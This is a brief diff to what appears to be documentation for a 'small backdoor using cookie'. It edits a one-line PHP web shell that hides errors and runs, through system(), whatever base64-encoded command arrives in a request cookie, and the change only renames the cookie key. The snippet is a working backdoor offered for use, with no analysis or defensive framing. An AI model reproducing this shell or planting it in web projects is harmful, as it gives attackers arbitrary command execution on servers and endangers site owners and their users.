@@ -8,7 +8,7 @@ Small backdoor using cookie.
 ==========
 
 ```php
-<?php error_reporting(0); system(base64_decode($_COOKIE["1"])); ?>
+<?php error_reporting(0); system(base64_decode($_COOKIE["yourcookie"])); ?>
 ```
 
 ```
